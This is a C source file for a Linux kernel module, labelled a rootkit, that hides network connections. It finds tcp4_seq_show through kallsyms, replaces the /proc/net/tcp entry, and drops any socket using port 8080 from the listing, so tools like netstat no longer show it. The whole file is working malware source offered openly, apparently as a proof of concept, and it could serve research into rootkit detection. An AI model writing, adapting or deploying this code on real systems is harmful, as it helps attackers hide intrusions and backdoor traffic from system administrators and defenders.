#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/net.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
//#include <proc/internal.h>
#include <linux/net_namespace.h>
#include <linux/seq_file.h>

#include <linux/proc_ns.h>
#include <linux/refcount.h>
#include <linux/spinlock.h>
#include <linux/atomic.h>
#include <linux/binfmts.h>
#include <linux/sched/coredump.h>
#include <linux/sched/task.h>

MODULE_LICENSE("GPL");

#define HIDE_PORT 0x1f90
#define DEBUG


asmlinkage int (*original_tcp4_seq_show)(struct seq_file *seq, void *v);

asmlinkage static int hooked_tcp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk = v;

    //if its the first print or struct has our port in it
    if ((v != SEQ_START_TOKEN) && (sk->__sk_common.skc_num == HIDE_PORT || sk->__sk_common.skc_dport == HIDE_PORT))
    {
        printk(KERN_INFO "[+] rootkit hide port in tcp4_seq_show\n");
        return 0;
    }

    return original_tcp4_seq_show(seq, v);
}

static const struct seq_operations tcp4_seq_ops = {
    .show       = hooked_tcp4_seq_show,
    .start      = tcp_seq_start,
    .next       = tcp_seq_next,
    .stop       = tcp_seq_stop,
};

static struct tcp_seq_afinfo tcp4_seq_afinfo = {
    .family     = AF_INET,
};

static int __init init_rootkit(void) {
    printk(KERN_INFO "[+] rootkit init_rootkit\n");

    original_tcp4_seq_show = (void *) kallsyms_lookup_name("tcp4_seq_show");
    if (0 == original_tcp4_seq_show)
    {
        printk(KERN_INFO "[!] rootkit Error Finding tcp4_seq_show\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit tcp4_seq_show = %lx\n", original_tcp4_seq_show);

    //struct net *net;
    //net = get_proc_net(inode);

    struct tcp_seq_afinfo *my_afinfo = NULL;
    struct proc_dir_entry * my_proc_net = init_net.proc_net;
    
    remove_proc_entry("tcp", my_proc_net);
    proc_create_net_data("tcp", 0444, my_proc_net, &tcp4_seq_ops, sizeof(struct tcp_iter_state), &tcp4_seq_afinfo);

    return 0;
}

static void __exit exit_rootkit(void) {
    printk(KERN_INFO "[+] rootkit exit_rootkit\n");
    return;
}

module_init(init_rootkit);
module_exit(exit_rootkit);